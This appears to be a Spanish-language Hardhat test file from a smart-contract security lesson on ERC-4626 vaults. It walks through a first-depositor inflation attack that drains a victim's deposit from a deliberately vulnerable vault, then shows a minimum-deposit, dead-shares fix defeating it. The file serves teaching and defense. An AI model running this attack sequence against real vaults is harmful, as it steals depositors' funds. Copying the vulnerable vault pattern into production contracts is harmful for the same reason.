import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { network } from "hardhat";

describe("14 - ERC-4626: bovedas tokenizadas", async function () {
  const { viem } = await network.create();
  const [owner, atacante, victima] = await viem.getWalletClients();

  describe("comportamiento normal", function () {
    it("depositar acuna acciones y redimir las devuelve por el activo", async function () {
      const activo = await viem.deployContract("TokenSubyacente", [1_000_000n]);
      const boveda = await viem.deployContract("BovedaERC4626Vulnerable", [activo.address]);

      await activo.write.approve([boveda.address, 1_000n]);
      await boveda.write.deposit([1_000n, owner.account.address]);

      // Sin nada depositado antes: 1 activo = 1 accion.
      assert.equal(await boveda.read.balanceOf([owner.account.address]), 1_000n);
      assert.equal(await boveda.read.totalAssets(), 1_000n);

      await boveda.write.redeem([1_000n, owner.account.address, owner.account.address]);

      assert.equal(await boveda.read.balanceOf([owner.account.address]), 0n);
      assert.equal(await activo.read.balanceOf([owner.account.address]), 1_000_000n);
    });
  });

  describe("ataque de inflacion del primer deposito", function () {
    it("version vulnerable: el atacante se queda con el deposito de la victima", async function () {
      const activo = await viem.deployContract("TokenSubyacente", [1_000_000n]);
      const boveda = await viem.deployContract("BovedaERC4626Vulnerable", [activo.address]);

      await activo.write.mint([atacante.account.address, 10_000n]);
      await activo.write.mint([victima.account.address, 1_000n]);

      // 1. El atacante deposita solo 1 unidad: es el primer deposito, asi
      //    que recibe exactamente 1 accion (totalSupply era 0).
      await activo.write.approve([boveda.address, 1n], { account: atacante.account });
      await boveda.write.deposit([1n, atacante.account.address], { account: atacante.account });

      assert.equal(await boveda.read.totalSupply(), 1n);

      // 2. El atacante DONA activo directamente a la boveda (transfer, no
      //    deposit): esto infla totalAssets() sin acunar ninguna accion
      //    nueva.
      await activo.write.transfer([boveda.address, 2_000n], { account: atacante.account });

      assert.equal(await boveda.read.totalAssets(), 2_001n);

      // 3. La victima deposita de buena fe. Sus acciones se calculan como
      //    (assets * totalSupply) / totalAssets = (1000 * 1) / 2001 = 0
      //    (division entera): se queda sin NINGUNA accion.
      await activo.write.approve([boveda.address, 1_000n], { account: victima.account });
      await boveda.write.deposit([1_000n, victima.account.address], { account: victima.account });

      assert.equal(await boveda.read.balanceOf([victima.account.address]), 0n);

      // 4. El atacante, dueno de la unica accion en circulacion, redime y
      //    se lleva TODO lo que hay en la boveda: su propio deposito, su
      //    propia donacion, Y el deposito completo de la victima.
      const activoAntes = await activo.read.balanceOf([atacante.account.address]);
      await boveda.write.redeem([1n, atacante.account.address, atacante.account.address], {
        account: atacante.account,
      });
      const activoDespues = await activo.read.balanceOf([atacante.account.address]);

      const ganancia = activoDespues - activoAntes;
      assert.ok(ganancia >= 1_000n, `el atacante deberia haberse llevado el deposito de la victima (gano ${ganancia})`);
    });

    it("version segura: el mismo ataque ya no vacia a la victima", async function () {
      const activo = await viem.deployContract("TokenSubyacente", [1_000_000n]);
      const boveda = await viem.deployContract("BovedaERC4626Segura", [activo.address]);

      await activo.write.mint([atacante.account.address, 10_000n]);
      await activo.write.mint([victima.account.address, 1_000n]);

      // El primer deposito minusculo ya no es posible: hay un minimo.
      await activo.write.approve([boveda.address, 1n], { account: atacante.account });
      await viem.assertions.revertWith(
        boveda.write.deposit([1n, atacante.account.address], { account: atacante.account }),
        "El primer deposito debe ser grande",
      );

      // El atacante intenta el mismo plan igual, pagando el "piso" de
      // acciones muertas.
      await activo.write.approve([boveda.address, 1_001n], { account: atacante.account });
      await boveda.write.deposit([1_001n, atacante.account.address], { account: atacante.account });

      assert.equal(await boveda.read.balanceOf([atacante.account.address]), 1n); // 1001 - 1000 quemadas
      assert.equal(await boveda.read.totalSupply(), 1_001n); // 1 real + 1000 quemadas

      await activo.write.transfer([boveda.address, 2_000n], { account: atacante.account });

      // La victima deposita: esta vez SI recibe acciones (el piso de 1000
      // acciones muertas evita que la relacion se licue hasta cero).
      await activo.write.approve([boveda.address, 1_000n], { account: victima.account });
      await boveda.write.deposit([1_000n, victima.account.address], { account: victima.account });

      const accionesVictima = await boveda.read.balanceOf([victima.account.address]);
      assert.ok(accionesVictima > 0n, "la victima deberia haber recibido acciones");

      // Y puede redimirlas por una parte real del activo, no por cero.
      await boveda.write.redeem([accionesVictima, victima.account.address, victima.account.address], {
        account: victima.account,
      });

      const activoFinalVictima = await activo.read.balanceOf([victima.account.address]);
      assert.ok(activoFinalVictima > 0n, "la victima deberia haber recuperado parte de su deposito");
    });
  });
});
